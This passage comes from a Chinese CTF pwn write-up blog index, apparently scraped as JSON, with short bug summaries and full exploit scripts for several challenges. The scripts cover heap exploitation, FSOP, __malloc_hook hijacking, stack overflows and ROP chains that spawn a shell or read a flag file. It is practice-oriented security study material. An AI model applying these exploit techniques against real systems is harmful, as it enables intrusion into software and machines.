str_jumps_offset - 8, # IO_str_jumps 0x30+0x38: libc_base_addr + bin_sh_offset, # /bin/sh 0x30+0xe8: libc.sym['system'] }, filler=\"\\x00\") recruite([0x460], [payload]) # 覆盖掉_IO_list_all expel(3) # 执行exit attack_boss() p.interactive() 构造大的chunk： unsortedbin attack: 覆盖掉_IO_list_all： 最后拿到shell： N系列\rCiscn-2019-N-7\r解题思路\r利用溢出修改指针的洞，将指针修改到stdout结构体上方，修改flag为0xfbad1800，然后修改IO_write_base为__environ地址，IO_write_ptr为__environ + 8地址，泄露栈地址 劫持__libc_start_main栈帧的retaddr，使用rop执行system(\"/bin/sh\") 这里用pwncli来写exp，只图高效，快捷 Exp\r#!/usr/bin/python3 from pwncli import * cli_script() if gift['remote']: libc = ELF('libc-2.23.so') elif gift['debug']: libc = gift['libc'] def add_page(p, size, name): p.sendlineafter(\"Your choice-\u003e \\n\",\"1\") p.sendlineafter(\"Length: \\n\", str(size)) p.sendafter(\"name:\\n\", name) p.recvline() def edit_page(p, name, content): p.sendlineafter(\"Your choic","date":"2021-09-12","objectID":"/zh-cn/2021-09-12-ciscn-2019-pwn%E7%B3%BB%E5%88%97/:0:0","tags":["pwn"],"title":"ciscn-2019-pwn系列","uri":"/zh-cn/2021-09-12-ciscn-2019-pwn%E7%B3%BB%E5%88%97/"},{"categories":["pwn-wp"],"content":"总结\r直接off by one可以修改指针，可以操作的空间非常大。其实觉得这题改改off by null，难度可能会高一点，one by one的话难度稍微低点。 修改指针然后泄露出libc的地址 fastbin attack劫持__malloc_hook，修改为one_gadget获取shell 题目漏洞\r溢出1字节刚好能修改到指针 Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(size:int): p.sendlineafter(\"6.exit\\n\", \"1\") p.sendlineafter(\"Input the size\\n\", str(size)) def delete(): p.sendlineafter(\"6.exit\\n\", \"2\") def show(): p.sendlineafter(\"6.exit\\n\", \"3\") return p.recvline() def update_name(name): p.sendlineafter(\"6.exit\\n\", \"4\") p.send(name) def edit_note(data): p.sendlineafter(\"6.exit\\n\", \"5\") p.sendafter(\"Input the note\", data) p.sendafter(\"Please input your name\\n\", \"lynne\") add(0x1f0) update_name(\"\\x00\" * 0x31) edit_note(flat({0:[0, 0x101], 0x100:[0, 0x101]})) update_name(\"\\x10\" * 0x31) delete() add(0x60) update_name(\"\\x80\" * 0x31) msg = show() info(\"msg recv: {}\".format(msg)) libc_base_addr = u64(msg[:-1] + b\"\\x00\\x00\") - 0x3c4b78 libc.address = libc_base_addr log_address(\"libc_base_addr\", libc_base_addr) update_name(\"\\x10\" * 0x31) delete() add(0x10) update_name(\"\\x10\" * 0x31) edit_note(p64(libc.sym['__malloc_hook'] - 0x23)) add(0x60) payload = flat([\"\\x00\" * 0xb, libc_base_addr + 0x4526a, libc.sym['realloc']+13], filler=\"\\x00\") add(0x60) edit_note(payload) add(0x10) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-09-05","objectID":"/zh-cn/2021-09-05-nsctf-online-2019-pwn2/:0:0","tags":["pwn"],"title":"nsctf_online_2019_pwn2","uri":"/zh-cn/2021-09-05-nsctf-online-2019-pwn2/"},{"categories":["pwn-wp"],"content":"总结\r禁用了fastbin，同时有off by null的漏洞。做出来后发现很多人的解是用的house of storm进行任意地址申请，覆盖__free_hook后，然后利用setcontext读取到的flag。我的方法却是利用的unsortedbin attack+fastbin attack，修改了global_max_fast的值之后，利用stdout泄露出堆地址，然后劫持_IO_list_all，用FSOP利用mprotect拿的flag。为啥不用house of storm，因为写起来麻烦，而我比较喜欢偷懒~ libc映射的空间上储存了堆地址和程序地址，如果能打stdout，那么想要啥地址基本都有。 题目分析\rChecksec\r保护全开，libc-2.23.so Seccomp\r函数分析\rInitial\r禁用了fastbin Add\r这里比较坑的是限制了size，否则直接unsortbin attack之后，都不需要泄露堆地址了。 其他函数没啥特殊的，漏洞放在下面分析。 漏洞点\r一个off by null的漏洞 利用思路\r这里直接给利用思路： 使用off by null制作三明治，然后泄露出libc地址 使用stdout泄露出heap地址。当然，使用largebin、smallbin等也是可以的 unsorted bin attack修改global_max_fast 利用fastbin attack劫持_IO_list_all FSOP控制程序执行流 Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def add(size:int): p.sendlineafter(\"Choice: \\n\", \"1\") p.sendlineafter(\"Size: \", str(size)) def edit(idx:int, data:(str, bytes)): p.sendlineafter(\"Choice: \\n\", \"2\") p.sendlineafter(\"Index: \", str(idx)) p.sendafter(\"Content: \", data) def delete(idx:int): p.sendlineafter(\"Choice: \\n\", \"3\") p.sendlineafter(\"Index: \", str(idx)) def show(idx:int): p.sendlineafter(\"Choice: \\n\", \"4\") p.sendlineafter(\"Index: \", str(idx)) return p.recvline() add(0x80) # 0 add(0x68) # 1 add(0xf0) # 2 add(0x800) # 3 delete(0) edit(1, flat([\"a\" * 0x60, 0x100])) delete(2) add(0x80) msg = show(1) libc_base_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) - 0x3c4b78 libc.address = libc_base_addr log_address(\"libc_base_addr\", libc_base_addr) delete(0) add(0xf0) add(0xf0) delete(0) add(0x80) edit(1, flat([0, libc_base_addr + 0x3c67f8 - 0x10])) add(0x60) delete(1) edit(4, p64(libc.sym[\"_IO_2_1_stdout_\"] - 0x43)) add(0x60) add(0x68) # 5 edit(5, flat(\"\\x00\" * 0x33, 0xfbad1887, 0, 0, 0, libc.sym['__curbrk'] - 8, libc.sym['__curbrk'] + 8)) msg = p.recvn(16) heap_base_addr = u64(msg[8:]) - 0x21000 log_address(\"heap_base_addr\", heap_base_addr) delete(1) edit(4, p64(libc.sym[\"_IO_list_all\"] - 0x23)) add(0x60) add(0x60) edit(6, flat([\"\\x00\" * 0x13, heap_base_addr+0x210])) delete(3) add(0x800) # 3 payload = flat({ 0x18:libc.sym['setcontext']+0x35, 0x28:1, 0xd8:heap_base_addr+0x210, 0xa0:heap_base_addr+0x210+0x100, 0xa8:libc.sym['mprotect'], 0x100: heap_base_addr+0x180+0x210, 0x68: heap_base_addr, 0x70: 0x3000, 0x88: 7, 0x180:asm(shellcraft.cat(\"/flag\")) }, filler=\"\\x00\") edit(3, payload) p.sendlineafter(\"Choice: \\n\", \"5\") p.interactive() 泄露libc： 泄露heap： 劫持_IO_list_all： 准备ROP读取flag： 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-09-05","objectID":"/zh-cn/2021-09-05-rctf-2019-babyheap/:0:0","tags":["pwn"],"title":"rctf_2019_babyheap","uri":"/zh-cn/2021-09-05-rctf-2019-babyheap/"},{"categories":["pwn-wp"],"content":"总结\r主要是限制了UAF的chunk的大小为0x20，并且限制了add的次数，就很难受，并且题目用的还是calloc，没有使用tcache。最后还是使用fastbin attack+unsortedbin attack + FSOP获取到的shell。 fastbin attack用于修改chunk size unsortedbin attack用于修改fast_global_max FSOP利用IO_str_finish拿shell 题目分析\rChecksec\r题目分析\r结构体\r逆向分析出Servent的结构体如下： struct Servent { char *name; uint64_t aggressivity; // 攻击力 }; 漏洞点\r漏洞1：recruite中的size可以为负数，下面做减法就会得到一个很大的正数，这样先把money搞到很大 漏洞2：expel分支 漏洞3：可以任意地址置为0，这个漏洞我没用到。但是隐约猜到了用处。 别的漏洞就没看到了。 利用过程\r利用漏洞1将money搞到很大 利用漏洞2，修改某个chunk的size，泄露出堆和libc地址 还是利用漏洞2，进行unsortedbin attack，打global_max_fast 释放一个很大的chunk，刚好覆盖掉_IO_list_all 利用FSOP拿shell Exp\r#!/usr/bin/python3 from pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def recruite(size:(tuple, list), name:(tuple, list)): p.sendlineafter(\"Give me your choice:\\n\", \"1\") p.sendlineafter(\"How many servents do you want to rescruit?\\n\", str(len(size))) for i in range(len(size)): p.sendlineafter(\"Input the name's size of this servent:\\n\", str(size[i])) p.sendafter(\"Input the name of this servent:\\n\", name[i]) def expel(idx:int): p.sendlineafter(\"Give me your choice:\\n\", \"2\") p.sendlineafter(\"Tell me his index number:\\n\", str(idx)) p.recvuntil(\"Ok, I'll kill \") msg = p.recvline() info(\"msg recv: {}\".format(msg)) return msg def buy_weapon(weapon_type:int): p.sendlineafter(\"Give me your choice:\\n\", \"3\") p.sendlineafter(\"2.Excalibur --90000yuan\\n\", str(weapon_type)) def attack_boss(use_big_weapon='n'): p.sendlineafter(\"Give me your choice:\\n\", \"4\") msg = p.recvline() if b\"Do you want to use excalibur?\" in msg: p.sendline(use_big_weapon) # 搞钱 p.sendlineafter(\"How much money do you want?\\n\", \"-1\") p.sendlineafter(\"Give me your choice:\\n\", \"1\") p.sendlineafter(\"How many servents do you want to rescruit?\\n\", str(-10000)) buy_weapon(2) # 为堆风水布局 recruite([0x18, 0x18, 0x18, 0x2000], [flat(0, 0x21), flat(0, 0x21), flat(0, 0x21), flat({0x400:[[0, 0x21, 0, 0] * 2], 0x1410:[[0, 0x21, 0, 0] * 2]})]) expel(1) expel(1) # 泄露堆地址 leak_addr = expel(1) heap_base_addr = u64(leak_addr[:6].ljust(8, b\"\\x00\")) - 0x2a0 log_address(\"heap_base_addr\", heap_base_addr) # fastbin attack for _ in range(5): expel(1) expel(0) expel(1) expel(0) recruite([0x18], [flat([0, 0x21, heap_base_addr + 0x280], length=0x18)]) # change size recruite([0x40, 0x18], [\"a\", flat(0, 0x71)]) for i in range(8): expel(1) # 改完size后得到一个大的chunk，释放它 expel(0) recruite([0x60], [flat({0:heap_base_addr + 0x2e0, 0x30: [0, 0x471]})]) expel(2) # 泄露libc地址 leak_addr = expel(1) libc_base_addr = u64(leak_addr[:6].ljust(8, b\"\\x00\")) - 0x3ebca0 log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr expel(0) # unsortedbin attack global_max_fast_offset = 0x3ed940 recruite([0x60], [flat({0x30:[0, 0x471, 0, libc_base_addr + global_max_fast_offset - 0x10]}, filler=\"\\x00\")]) expel(0) str_jumps_offset = 0x3e8360 lock_offset = 0x3ed8c0 bin_sh_offset = 0x1b3e9a payload = flat({ 0x30: [0, 0x1441], 0x30+0x80: 0, 0x30+0x88: libc_base_addr + lock_offset, # lock 0x30+0xc0: 0, 0x30+0x28: 0xffffffffffffff, # write_ptr 0x30+0xd8: libc_base_addr + str_jumps_offset - 8, # IO_str_jumps 0x30+0x38: libc_base_addr + bin_sh_offset, # /bin/sh 0x30+0xe8: libc.sym['system'] }, filler=\"\\x00\") recruite([0x460], [payload]) # 覆盖掉_IO_list_all expel(3) # 执行exit attack_boss() p.interactive() 构造大的chunk： unsortedbin attack: 覆盖掉_IO_list_all： 最后拿到shell： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-29","objectID":"/zh-cn/2021-08-29-ciscn-2019-c-7/:0:0","tags":["pwn"],"title":"ciscn_2019_c_7","uri":"/zh-cn/2021-08-29-ciscn-2019-c-7/"},{"categories":["pwn-wp"],"content":"总结\rbaby中的baby，记录下exp，水一篇博客。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] p.sendafter(\"Input your Name:\\n\", \"a\" * 0x29) p.recvuntil(\"a\" * 0x29) msg = p.recvn(7) canary = (u64(msg+b\"\\x00\")) \u003c\u003c 8 log_address(\"canary\", canary) p.send(flat([\"a\"*0x28, canary, 0, \"\\x3e\"])) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-22","objectID":"/zh-cn/2021-08-22-linkctf-2018-7-babypie/:0:0","tags":["pwn"],"title":"linkctf_2018.7_babypie","uri":"/zh-cn/2021-08-22-linkctf-2018-7-babypie/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 当off by one遇到calloc的时候，需要多次布局让2个指针，指向同一个0x70的chunk，然后一个先释放，然后利用unsorted bin的分割，使得fd变为main_arena + 88，再用另一个指针去修改fd劫持stdout结构体 分配chunk的时候，可以尽可能的小，对chunk的size要有敏感度 伪造IO_FILE结构的时候，注意_lock字段 题目分析\rChecksec\r运行环境为libc-2.23.so 漏洞点\r问题出在update函数，看了下其他人的解，好像都没注意到一个索引溢出的漏洞。 利用思路\r思路一\r由于索引可以溢出，所以溢出上去看看，发现刚好可以溢出修改stdout结构体，因此，思路就很简单： 修改_IO_2_1_stdout_的_IO_write_base的低字节为0x58和_flags为0xfbad1887，泄露出libc的地址 再次劫持整个_IO_2_1_stdout_结构，直接伪造vtable，然后利用puts的调用链，执行system(\"/bin/sh\") 泄露地址： 思路二\r就是利用unlink爆破四个bit位劫持stdout，然后再劫持__malloc_hook为one_gdget去拿shell 利用off by null使用unlink劫持stdout，泄露地址 劫持__malloc_hook Exp\r本地调试exp\r两个方法都写在这儿了 from pwncli import * cli_script() def add(p:tube, size:int, data:(str, bytes)=\"deadbeef\\n\"): p.sendlineafter(\"5.exit\\n\", \"1\") p.sendlineafter(\"Input the size:\\n\", str(size)) p.sendafter(\"Input the content:\\n\", data) def delete(p:tube, idx:int): p.sendlineafter(\"5.exit\\n\", \"2\") p.sendlineafter(\"Input the index:\\n\", str(idx)) def update(p:tube, idx:int, size:int, data:(str, bytes)): p.sendlineafter(\"5.exit\\n\", \"4\") p.sendlineafter(\"Input the index:\\n\", str(idx)) p.sendlineafter(\"Input size:\\n\", str(size)) p.sendafter(\"Input new content:\\n\", data) def attack_by_stdout(p:tube, libc:ELF): # leak addr by stdout payload = flat(0xfbad1887, 0, 0, 0, \"\\x58\") update(p, -16, 0xdead, payload) leak_addr = u64(p.recvn(8)) log_address(\"leak_addr\", leak_addr) libc_base_addr = leak_addr - 0x3c56a3 log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr # hijack IO_XSPUTN to system file_str = FileStructure() file_str.flags = u64(\"/bin/sh\\x00\") file_str.vtable = libc.sym[\"_IO_2_1_stdout_\"] + 0x10 file_str._IO_save_base = libc.sym['system'] file_str._lock = libc_base_addr + 0x3c6780 update(p, -16, 0xdead, bytes(file_str)) p.interactive() def attack_off_by_one(p:tube, libc:ELF): add(p, 0x80) # 0 add(p, 0x68) # 1 add(p, 0xf0) # 2 add(p, 0x20) # 3 gap # free 0 delete(p, 0) update(p, 1, 0x68, flat({0x60:0x100}, length=0x68)) delete(p, 2) add(p, 0x80) # 0 add(p, 0x68) # 2 add(p, 0xf0) # 4 # again delete(p, 0) update(p, 2, 0x68, flat({0x60:0x100}, length=0x68)) delete(p, 4) # add(p, 0xf0, flat({0x80:[0, 0x71]})) # 0 add(p, 0xf0) # 4 delete(p, 0) delete(p, 1) add(p, 0x80) secb = input(\"Give me the second byte: \") payload = p16(((int16(secb)) \u003c\u003c 8) + 0xdd) update(p, 2, 0x2, payload) add(p, 0x60) # 1 p.sendlineafter(\"5.exit\\n\", \"1\") p.sendlineafter(\"Input the size:\\n\", str(0x59)) # 1 p.sendafter(\"Input the content:\", flat([\"\\x00\" * 0x33, 0xfbad1887, 0, 0, 0, \"\\x58\"], filler=\"\\x00\")) leak_addr = u64(p.recvn(8)) libc_base_addr = leak_addr - 0x3c56a3 log_address(\"libc_base_addr\", libc_base_addr) delete(p, 1) payload = p64(libc.sym['__malloc_hook'] - 0x23 + libc_base_addr) update(p, 2, 0x8, payload) add(p, 0x60) # payload = flat([\"\\x00\" * 11, libc_base_addr + 0xf1147, libc.sym['realloc'] + libc_base_addr], filler=\"\\x00\") payload = flat([\"\\x00\" * 0x13, libc_base_addr + 0xf1147], filler=\"\\x00\") add(p, 0x60, payload) p.sendlineafter(\"5.exit\\n\", \"1\") p.sendlineafter(\"Input the size:\\n\", str(0x123)) # 1 p.interactive() attack_by_stdout(gift['io'], gift['libc']) 爆破版exp\r利用一个装饰器即可进行爆破，只要函数遵循相关调用约定 from pwncli import * def add(p:tube, size:int, data:(str, bytes)=\"deadbeef\\n\"): p.sendlineafter(\"5.exit\\n\", \"1\") p.sendlineafter(\"Input the size:\\n\", str(size)) p.sendafter(\"Input the content:\\n\", data) def delete(p:tube, idx:int): p.sendlineafter(\"5.exit\\n\", \"2\") p.sendlineafter(\"Input the index:\\n\", str(idx)) def update(p:tube, idx:int, size:int, data:(str, bytes)): p.sendlineafter(\"5.exit\\n\", \"4\") p.sendlineafter(\"Input the index:\\n\", str(idx)) p.sendlineafter(\"Input size:\\n\", str(size)) p.sendafter(\"Input new content:\\n\", data) # @remote_enumerate_attack(ip='node4.buuoj.cn', port=29958, libc_path=\"/root/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so\", loop_time=0x30) @local_enumerate_attack(argv=\"./nsctf_online_2019_pwn1\",libc_path=\"/root/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so\", loop_time=0x40) def attack_off_by_one","date":"2021-08-22","objectID":"/zh-cn/2021-08-22-nsctf-online-2019-pwn1/:0:0","tags":["pwn"],"title":"nsctf_online_2019_pwn1","uri":"/zh-cn/2021-08-22-nsctf-online-2019-pwn1/"},{"categories":["pwn-wp"],"content":"总结\r一个UAF洞，然后是常规的unlink。穿插着一个malloc_consolidation的理解，即如何构造unlink的条件。 利用过程\r申请小的chunk 申请大的chunk 释放掉小的chunk 申请超大的chunk，此时触发malloc_consolidation，得到一个小的samll bin chunk 再次释放小的chunk去overlap 申请小的chunk，布局unlink 释放大的chunk，触发unlink 修改free@got为puts@plt泄露地址 修改free@got为system获取shell Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def keep(size_type:int, data:(str, bytes)): p.sendlineafter(\"3. Renew secret\\n\", \"1\") p.sendlineafter(\"2. Big secret\\n\", str(size_type)) p.sendafter(\"Tell me your secret: \\n\", data) def swip(size_type:int): p.sendlineafter(\"3. Renew secret\\n\", \"2\") p.sendlineafter(\"2. Big secret\\n\", str(size_type)) def renew(size_type:int, data:(str, bytes)): p.sendlineafter(\"3. Renew secret\\n\", \"3\") p.sendlineafter(\"2. Big secret\\n\", str(size_type)) p.sendafter(\"Tell me your secret: \\n\", data) def get_small(data=\"deadbeef\\n\"): keep(1, data) def get_big(data=\"deadbeef\\n\"): keep(2, data) def get_huge(data=\"deadbeef\\n\"): keep(3, data) def free_small(): swip(1) def free_big(): swip(2) def write_small(data): renew(1, data) def write_big(data): renew(2, data) get_small() get_big() free_small() get_huge() free_small() layout = [0, 0x21, 0x6020d0-0x18, 0x6020d0 - 0x10, 0x20] get_small(flat(layout)) free_big() write_small(flat(0, elf.got['puts'], 0, elf.got['free'], (1 \u003c\u003c 32) + 1)) write_small(p64(elf.plt['puts'])) free_big() libc_base_addr = u64(p.recvn(6) + b\"\\x00\\x00\") - libc.sym['puts'] log_address(\"libc_base_addr\", libc_base_addr) write_small(p64(libc.sym['system'] + libc_base_addr)) get_big(\"/bin/sh\\x00\") free_big() p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-21","objectID":"/zh-cn/2021-08-21-sleepyholder-hitcon-2016/:0:0","tags":["pwn"],"title":"sleepyHolder_hitcon_2016","uri":"/zh-cn/2021-08-21-sleepyholder-hitcon-2016/"},{"categories":["pwn-wp"],"content":"总结\r基础的UAF的题，只记录下exp吧。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def new(name, length, desc): p.sendlineafter(\"choose:\", \"1\") p.sendlineafter(\"Item name?\\n\", name) p.sendlineafter(\"Description's len?\\n\", str(length)) p.sendlineafter(\"Description?\\n\", desc) def show(idx): p.sendlineafter(\"choose:\", \"3\") p.sendlineafter(\"Which item?\\n\", str(idx)) return p.recvlines(3) def remove(idx): p.sendlineafter(\"choose:\", \"4\") p.sendlineafter(\"Which item?\\n\", str(idx)) new(\"lynne\", 0x80, \"lynne\") new(\"lynne\", 0x20, \"lynne\") remove(0) _, _1, leak_addr = show(0) libc_base_addr = u64(leak_addr[-6:].ljust(8, b\"\\x00\")) - 0x3c4b78 remove(1) new(\"aaaaa\", 0x18, b\"/bin/sh;\" + b\"a\" * 8 + p64(libc_base_addr + libc.sym['system'])[:-1]) remove(0) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-21","objectID":"/zh-cn/2021-08-21-jarvisoj-itemboard/:0:0","tags":["pwn"],"title":"jarvisoj_itemboard","uri":"/zh-cn/2021-08-21-jarvisoj-itemboard/"},{"categories":["pwn-wp"],"content":"总结\r仍然是tcache stash unlink的利用，这里总结两种思路： 任意地址分配时，先放5个，然后再凑2个出来 写堆地址的时候，放6个，伪造一下bk即可 利用思路\r只有punch分支才能用malloc，其他分支都是calloc，因此要想办法使得punch的条件成立，即tcaceh bin[0x220]的个数要大于6。因此有两种思路： 思路1\r任意地址分配，分配到malloc_hook上方，然后利用一些gadget进行rop。 思路2\r错位往tcahebin[0x220]的count位置，写入0x7f，即可绕过校验。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] pop_rdi_ret = 0x26542 pop_rsi_ret = 0x26f9e pop_rdx_ret = 0x12bda6 pop_rax_ret = 0x47cf8 syscall_ret = 0xcf6c5 def debut(idx, size, name=\"a\"): if isinstance(name, str): pad = \"a\" else: pad = b\"a\" name = name.ljust(size, pad) p.sendlineafter(\"\u003e \", \"1\") p.sendlineafter(\"idx: \", str(idx)) p.sendafter(\"hero name: \", name) def rename(idx, name): p.sendlineafter(\"\u003e \", \"2\") p.sendlineafter(\"idx: \", str(idx)) p.sendafter(\"hero name: \", name) def show(idx): p.sendlineafter(\"\u003e \", \"3\") p.sendlineafter(\"idx: \", str(idx)) p.recvuntil(\"hero name: \") return u64(p.recvline()[:-1].ljust(8, b\"\\x00\")) def retire(idx): p.sendlineafter(\"\u003e \", \"4\") p.sendlineafter(\"idx: \", str(idx)) def punch(data): p.sendlineafter(\"\u003e \", \"50056\") p.send(data) p.recvuntil(\"Serious Punch!!!\\n\") # use tcachebin stach unlink, while has 5, to malloc at any address def attack1(): debut(0, 0x400) retire(0) debut(1, 0x400) retire(1) heap_base_addr = show(1) - 0x260 log_address(\"heap_base_addr\", heap_base_addr) for i in range(5): debut(0, 0x400) retire(0) debut(0, 0x400) for i in range(5): debut(1, 0x210) retire(1) retire(0) libc_base_addr = show(0) - 0x1e4ca0 libc.address = libc_base_addr log_address(\"libc_base_addr\", libc_base_addr) # split chunk debut(1, 0x1e0) # get smallbin chunk debut(1, 0x400) payload = flat({ 0: [0, 0x221, heap_base_addr + 0x20b0, libc_base_addr + 0x1e4bf8], 0x1e0: [0, 0x221, 0xdeadbeef, heap_base_addr + 0x1ed0] }, filler=\"\\x00\") rename(0, payload) # to trigger tcache stash unlink debut(1, 0x210) # to change __malloc_hook payload = flat({ 0x20: \"/flag\\x00\\x00\\x00\", 0x28: libc_base_addr + 0x99540 }) punch(payload) layout = [ libc_base_addr + pop_rdi_ret, # rdi libc.sym[\"__malloc_hook\"] - 8, libc_base_addr + pop_rsi_ret, # rsi 0, libc_base_addr + pop_rax_ret, # rax 2, # open(\"/flag\", 0) libc_base_addr + syscall_ret, # syscall libc_base_addr + pop_rdi_ret, 3, libc_base_addr + pop_rsi_ret, heap_base_addr + 0x400, libc_base_addr + pop_rdx_ret, 0x30, libc_base_addr + pop_rax_ret, 0, # read libc_base_addr + syscall_ret, libc_base_addr + pop_rdi_ret, 1, libc_base_addr + pop_rax_ret, 1, libc_base_addr + syscall_ret ] debut(1, 0x300, flat(layout)) p.interactive() # use tcachebin stach unlink, while has 6, to write heap address at any address def attack2(): debut(0, 0x400) retire(0) debut(1, 0x400) retire(1) heap_base_addr = show(1) - 0x260 log_address(\"heap_base_addr\", heap_base_addr) for i in range(5): debut(0, 0x400) retire(0) debut(0, 0x400) for i in range(6): debut(1, 0x2f0) retire(1) debut(2, 0x210) retire(2) # stop() retire(0) libc_base_addr = show(0) - 0x1e4ca0 libc.address = libc_base_addr log_address(\"libc_base_addr\", libc_base_addr) # split chunk debut(1, 0x100) # get smallbin chunk debut(1, 0x400) payload = flat({ 0: [0, 0x301, heap_base_addr + 0x1fd0, heap_base_addr + 0x20 - 5], 0x100: [0, 0x301, 0xdeadbeef, heap_base_addr + 0x1ed0] }, filler=\"\\x00\") rename(0, payload) # to trigger tcache stash unlink debut(1, 0x2f0) rename(2, p64(libc.sym['__malloc_hook']-8)) punch(\"a\" * 0x60) punch(b\"/flag\\x00\\x00\\x00\" + p64(libc_base_addr + 0x8cfd6)) # add rsp 0x48; ret layout = [ libc_base_addr + pop_rdi_ret, # rdi libc.sym[\"__malloc_hook\"] - 8, libc_base_addr + pop_rsi_ret, # rsi 0, libc_base_addr + pop_rax_ret, # rax 2, # open(\"/flag\", 0) libc_base_addr + syscall_ret, # syscall libc_base_addr + pop_rdi_ret, 3, libc_base_addr + pop_rsi_ret, heap_base_addr + 0x400, libc_base_addr + pop_rdx_ret, 0x30, libc_base_addr + pop_rax_ret, 0, # read libc_base_addr + syscall_ret, libc_base_addr + pop_rdi_ret, 1, libc_base_addr + pop_rax_ret, 1, libc_base_addr + syscall_ret ] debut(1, 0x300, flat(layout)) p.i","date":"2021-08-21","objectID":"/zh-cn/2021-08-21-hitcon-ctf-2019-one-punch/:0:0","tags":["pwn"],"title":"hitcon_ctf_2019_one_punch","uri":"/zh-cn/2021-08-21-hitcon-ctf-2019-one-punch/"},{"categories":["pwn-wp"],"content":"总结\r题目可以任意地址写任意值，但是没有退出，因此可以考虑劫持rtld_global结构体中的一些函数指针。 利用exit函数的两个hook，同时观察寄存器状态，构造system(\"/bin/sh\")拿shell。 这里出现的rtld_global结构体，可以伪造，可以修改。比如在house of banana中就能利用。远程中该结构体的低2字节需要爆破一下。两个函数指针的偏移分别为0xf00和0xf08。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc: ELF = gift['libc'] def write(addr:int, content:(str, bytes)): assert len(content) % 8 == 0, \"len error!\" for i in range(0, len(content), 8): p.sendlineafter(\"(q)uit\\n\", 'w') p.sendlineafter(\"ptr: \", str(addr + i)) p.sendlineafter(\"val: \", str(u64(content[i:i+8]))) libc.address = int16((p.recvline()[6:-1]).decode()) - libc.sym['puts'] stack_addr = int16((p.recvline()[7:-1]).decode()) log_address(\"libc_base_addr\", libc.address) log_address(\"stack addr\", stack_addr) rtld_global_addr = libc.address + 0x619060 log_address(\"rtld_global_addr\", rtld_global_addr) write(rtld_global_addr+0x908, \"/bin/sh\\x00\") write(rtld_global_addr+0xf00, p64(libc.sym['system'])) p.sendlineafter(\"(q)uit\\n\", 'q') p.interactive() 劫持效果如下： 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-21","objectID":"/zh-cn/2021-08-21-bbctf-2020-write/:0:0","tags":["pwn"],"title":"bbctf_2020_write","uri":"/zh-cn/2021-08-21-bbctf-2020-write/"},{"categories":["pwn-wp"],"content":"总结\r题如其名，虽然简单，但是有个小坑，就是栈溢出的过程中，会把索引给覆盖掉，所以要注意索引的值： 即这里的v4为索引，在rbp的下方，溢出的时候注意一下即可。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] elf:ELF = gift['elf'] libc:ELF = gift['libc'] payload = flat([b\"a\"*(0x110 - 4), p32(0x10d), 0, 0x0000000000400843, elf.got['puts'], elf.plt['puts'], 0x400790]) p.sendlineafter(\"Hack 4 fun!\\n\", payload) msg = p.recvline() libc_base_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) - libc.sym['puts'] log_address(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr # sleep(1) payload = flat([b\"b\"*(0x110 - 4), p32(0x10d), 0xdeadbeef, 0x400843, libc.search(b\"/bin/sh\").__next__(), libc.sym['system']]) p.sendlineafter(\"Hack 4 fun!\\n\", payload) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-20","objectID":"/zh-cn/2021-08-20-gwctf-2019-jiandan-pwn1/:0:0","tags":["pwn"],"title":"gwctf_2019_jiandan_pwn1","uri":"/zh-cn/2021-08-20-gwctf-2019-jiandan-pwn1/"},{"categories":["pwn-wp"],"content":"总结\r本以为是要逆一下MD5，后来定睛一看，原来是个隐藏的栈迁移的题，还自带system(\"/bin/sh\")。怪不得叫login，的确是签到题。也只记录下exp。 Exp\rfrom pwncli import * cli_script() p:tube = gift['io'] payload = p32(0xdeadbeef) + p32(0x804925f) + p32(0x811eb40) p.sendline(b64e(payload)) p.interactive() 引用与参考\r1、My Blog 2、Ctf Wiki 3、pwncli ","date":"2021-08-20","objectID":"/zh-cn/2021-08-20-pwnable-simple-login/:0:0","tags":["pwn"],"title":"pwnable_simple_login","uri":"/zh-cn/2021-08-20-pwnable-simple-login/"},{"categories":["pwn-wp"],"content":"总结\r经典的利用fastbin [0x70]，然后攻击__malloc_hook + __realloc_hook的题。只记录下exp。 Exp\rfrom pwncli import * cli_script() p = gift['io'] elf = gift['elf'] libc = gift['libc'] def author_name(name=\"lynne\"): p.sendlineafter(\"Enter author name: \", name) def create(name_size, name, desc_size, desc): p.sendlineafter(\"\u003e \", \"1\") p.sendlineafter(\"\\nEnter book name size: \", str(name_size)) p.sendafter(\"Enter book name (Max 32 chars): \", name) p.sendlineafter(\"\\nEnter book description size: \", str(desc_size)) p.sendafter(\"Enter book description: \", desc) def delete(idx): p.sendlineafter(\"\u003e \", \"2\") p.sendlineafter(\"Enter the book id you want to delete: \", str(idx)) def edit(idx, desc): p.sendlineafter(\"\u003e \", \"3\") 